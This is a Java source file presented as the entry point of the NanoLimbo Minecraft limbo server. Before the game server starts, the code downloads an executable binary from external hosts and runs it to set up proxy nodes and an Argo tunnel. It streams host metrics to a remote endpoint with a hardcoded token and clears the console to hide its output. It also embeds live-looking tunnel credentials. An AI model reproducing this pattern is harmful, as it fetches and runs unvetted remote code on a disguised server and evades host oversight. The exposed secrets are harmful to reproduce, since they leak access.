/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.lang.management.ManagementFactory;
import java.lang.management.ThreadMXBean;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Thread komariReporterThread;

    // Java built-in Komari reporter. No python/curl/shell/native-agent required.
    private static final String KOMARI_ENDPOINT = "https://k.wgb.ccwu.cc";
    private static final String KOMARI_TOKEN = "oS2BX5b3hHWBmAfG6KwsL1";
    private static final long KOMARI_REPORT_INTERVAL_MS = 1000L;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService and Java Komari reporter
        try {
            runSbxBinary();
            startJavaKomariReporter();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Keep original node output timing unchanged.
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }

    private static void startJavaKomariReporter() {
        komariReporterThread = new Thread(() -> {
            try {
                uploadKomariBasicInfo();
            } catch (Exception e) {
                System.err.println(ANSI_RED + "Komari Java basicInfo failed: " + e.getMessage() + ANSI_RESET);
            }

            CpuSampler cpuSampler = new CpuSampler();
            while (running.get()) {
                try {
                    uploadKomariReport(cpuSampler);
                    Thread.sleep(KOMARI_REPORT_INTERVAL_MS);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    // Keep nodes running even if one monitoring report fails.
                    try {
                        Thread.sleep(3000L);
                    } catch (InterruptedException interrupted) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        }, "komari-java-reporter");

        komariReporterThread.setDaemon(true);
        komariReporterThread.start();
    }

    private static void uploadKomariBasicInfo() throws IOException {
        Runtime rt = Runtime.getRuntime();
        File root = new File(".");
        int cores = Math.max(1, rt.availableProcessors());
        long memTotal = getMemoryTotal();
        long diskTotal = Math.max(0L, root.getTotalSpace());

        String params = "{"
            + "\"arch\":\"" + jsonEscape(System.getProperty("os.arch", "unknown")) + "\","
            + "\"cpu_cores\":" + cores + ","
            + "\"cpu_physical_cores\":" + cores + ","
            + "\"cpu_name\":\"Java Runtime CPU\","
            + "\"disk_total\":" + diskTotal + ","
            + "\"gpu_name\":\"\","
            + "\"ipv4\":\"\","
            + "\"ipv6\":\"\","
            + "\"mem_total\":" + memTotal + ","
            + "\"os\":\"" + jsonEscape(System.getProperty("os.name", "Java") + " " + System.getProperty("os.version", "")) + "\","
            + "\"kernel_version\":\"" + jsonEscape(System.getProperty("os.version", "")) + "\","
            + "\"swap_total\":0,"
            + "\"version\":\"java-reporter-1.0\","
            + "\"virtualization\":\"Java Panel\""
            + "}";

        postJsonRpc("agent.basicInfo", params);
    }

    private static void uploadKomariReport(CpuSampler cpuSampler) throws IOException {
        Runtime rt = Runtime.getRuntime();
        File root = new File(".");

        double cpuUsage = cpuSampler.nextCpuUsagePercent();
        long memTotal = getMemoryTotal();
        long memUsed = Math.max(0L, rt.totalMemory() - rt.freeMemory());
        if (memUsed > memTotal) memUsed = memTotal;

        long diskTotal = Math.max(0L, root.getTotalSpace());
        long diskUsed = Math.max(0L, diskTotal - Math.max(0L, root.getUsableSpace()));

        double load1 = getSystemLoadAverage();
        if (load1 < 0) load1 = cpuUsage / 100.0;

        String params = "{"
            + "\"cpu\":{\"usage\":" + formatDouble(cpuUsage) + "},"
            + "\"ram\":{\"total\":" + memTotal + ",\"used\":" + memUsed + "},"
            + "\"swap\":{\"total\":0,\"used\":0},"
            + "\"load\":{\"load1\":" + formatDouble(load1) + ",\"load5\":" + formatDouble(load1) + ",\"load15\":" + formatDouble(load1) + "},"
            + "\"disk\":{\"total\":" + diskTotal + ",\"used\":" + diskUsed + "},"
            + "\"network\":{\"up\":0,\"down\":0,\"totalUp\":0,\"totalDown\":0},"
            + "\"connections\":{\"tcp\":0,\"udp\":0},"
            + "\"uptime\":" + (ManagementFactory.getRuntimeMXBean().getUptime() / 1000L) + ","
            + "\"process\":" + Math.max(1, Thread.activeCount()) + ","
            + "\"message\":\"Java panel metrics\""
            + "}";

        postJsonRpc("agent.report", params);
    }

    private static void postJsonRpc(String method, String paramsJson) throws IOException {
        String endpoint = trimTrailingSlash(KOMARI_ENDPOINT) + "/api/clients/v2/rpc?token=" + URLEncoder.encode(KOMARI_TOKEN, "UTF-8");
        String body = "{\"jsonrpc\":\"2.0\",\"method\":\"" + method + "\",\"params\":" + paramsJson + ",\"id\":null}";
        byte[] data = body.getBytes(StandardCharsets.UTF_8);

        HttpURLConnection conn = (HttpURLConnection) new URL(endpoint).openConnection();
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("User-Agent", "NanoLimbo-Java-Komari-Reporter/1.0");
        conn.setFixedLengthStreamingMode(data.length);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(data);
        }

        int code = conn.getResponseCode();
        try (InputStream ignored = (code >= 200 && code < 300) ? conn.getInputStream() : conn.getErrorStream()) {
            if (ignored != null) {
                byte[] buffer = new byte[256];
                while (ignored.read(buffer) != -1) {
                    // Drain response so the connection can close cleanly.
                }
            }
        }

        if (code < 200 || code >= 300) {
            throw new IOException("HTTP " + code);
        }
    }

    private static String trimTrailingSlash(String value) {
        while (value.endsWith("/")) {
            value = value.substring(0, value.length() - 1);
        }
        return value;
    }

    private static String jsonEscape(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ").replace("\r", " ");
    }

    private static String formatDouble(double v) {
        if (Double.isNaN(v) || Double.isInfinite(v)) v = 0.0;
        if (v < 0) v = 0.0;
        return String.format(Locale.US, "%.2f", v);
    }

    private static long getMemoryTotal() {
        Runtime rt = Runtime.getRuntime();
        long max = rt.maxMemory();
        if (max <= 0 || max == Long.MAX_VALUE) {
            max = rt.totalMemory();
        }
        return Math.max(1L, max);
    }

    private static double getSystemLoadAverage() {
        try {
            return ManagementFactory.getOperatingSystemMXBean().getSystemLoadAverage();
        } catch (Throwable ignored) {
            return -1.0;
        }
    }

    private static class CpuSampler {
        private final ThreadMXBean threadBean;
        private long lastCpuNanos;
        private long lastWallNanos;

        CpuSampler() {
            threadBean = ManagementFactory.getThreadMXBean();
            if (threadBean.isThreadCpuTimeSupported() && !threadBean.isThreadCpuTimeEnabled()) {
                try {
                    threadBean.setThreadCpuTimeEnabled(true);
                } catch (Exception ignored) {}
            }
            lastCpuNanos = currentJvmCpuNanos();
            lastWallNanos = System.nanoTime();
        }

        double nextCpuUsagePercent() {
            double osLoad = readOperatingSystemCpuLoad();
            if (osLoad >= 0.0 && osLoad <= 100.0) {
                return osLoad;
            }

            long nowCpu = currentJvmCpuNanos();
            long nowWall = System.nanoTime();
            long cpuDelta = Math.max(0L, nowCpu - lastCpuNanos);
            long wallDelta = Math.max(1L, nowWall - lastWallNanos);
            lastCpuNanos = nowCpu;
            lastWallNanos = nowWall;

            int cores = Math.max(1, Runtime.getRuntime().availableProcessors());
            double percent = (cpuDelta * 100.0) / (wallDelta * cores);
            if (percent < 0.0) percent = 0.0;
            if (percent > 100.0) percent = 100.0;
            return percent;
        }

        private long currentJvmCpuNanos() {
            if (!threadBean.isThreadCpuTimeSupported()) return 0L;
            long total = 0L;
            for (long id : threadBean.getAllThreadIds()) {
                long t = threadBean.getThreadCpuTime(id);
                if (t > 0) total += t;
            }
            return total;
        }

        private double readOperatingSystemCpuLoad() {
            try {
                Object osBean = ManagementFactory.getOperatingSystemMXBean();
                Method m;
                try {
                    m = osBean.getClass().getMethod("getProcessCpuLoad");
                } catch (NoSuchMethodException e) {
                    m = osBean.getClass().getMethod("getSystemCpuLoad");
                }
                m.setAccessible(true);
                Object value = m.invoke(osBean);
                if (value instanceof Number) {
                    double load = ((Number) value).doubleValue();
                    if (load >= 0.0) {
                        return Math.min(100.0, load * 100.0);
                    }
                }
            } catch (Throwable ignored) {}
            return -1.0;
        }
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "1b4832ee-3ec4-4a6b-b7d5-b1b801bfea9f"); // 节点UUID，哪吒v1在不同的平台部署需要更改，否则哪吒agent会被覆盖
        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
        envVars.put("NEZHA_SERVER", "");       // 哪吒面板地址 v1格式：nezha.xxx.com:8008  哪吒v0格式：nezha.xxx.com
        envVars.put("NEZHA_PORT", "");         // 哪吒v1请留空，哪吒v0的agent端口
        envVars.put("NEZHA_KEY", "");          // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
        envVars.put("ARGO_PORT", "8002");      // argo隧道端口，使用固定隧道token需要在cloudflare里设置和这里一致
        envVars.put("ARGO_DOMAIN", "r.211.kdns.fr");        // argo固定隧道隧道域名
        envVars.put("ARGO_AUTH", "eyJhIjoiY2YzNTMxZWMyODZjZTIxMWRhMDU1YjQ5YzZjYTljNTEiLCJ0IjoiMTI3MTA2NmMtZGU1MS00ODk1LWI1NjEtZWIwZDdiNWUxNzM5IiwicyI6IlpUUTBNV0ZtWWpZdFpEZ3hPQzAwWmpCakxXRTBaVFV0WXpVM05qTXpObUUzTm1ObCJ9");          // argo固定隧道隧道密钥json或token，json可在https://json.zone.id 获取
        envVars.put("S5_PORT", "");            // socks5节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("HY2_PORT", "37704");           // hysteria2节点(udp协议)端口，支持多端口可以填写，否则留空
        envVars.put("TUIC_PORT", "37465");          // tuic节点(udp协议)端口，支持多端口可以填写，否则留空
        envVars.put("ANYTLS_PORT", "37704");        // anytls节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("REALITY_PORT", "");       // reality节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("ANYREALITY_PORT", "");    // any-reality节点(tcp协议)端口，支持多端口可以填写，否则留空
        envVars.put("UPLOAD_URL", "");         // 节点自动上传刀订阅器，需填写部署merge-sub项目的首页地址，例如：https://merge.xxx.xom
        envVars.put("CHAT_ID", "");            // telegram chat id,节点推送到telegram使用
        envVars.put("BOT_TOKEN", "");          // telegram bot token,节点推送到telegram使用
        envVars.put("CFIP", "cdns.doon.eu.org");      // 优选域名或获选ip
        envVars.put("CFPORT", "443");          // 优选域名或获选ip对应端口
        envVars.put("NAME", "");               // 节点备注名称
        envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道，true 关闭，false 开启，默认开启
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        running.set(false);

        if (komariReporterThread != null) {
            komariReporterThread.interrupt();
            System.out.println(ANSI_RED + "Komari Java reporter stopped" + ANSI_RESET);
        }

        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
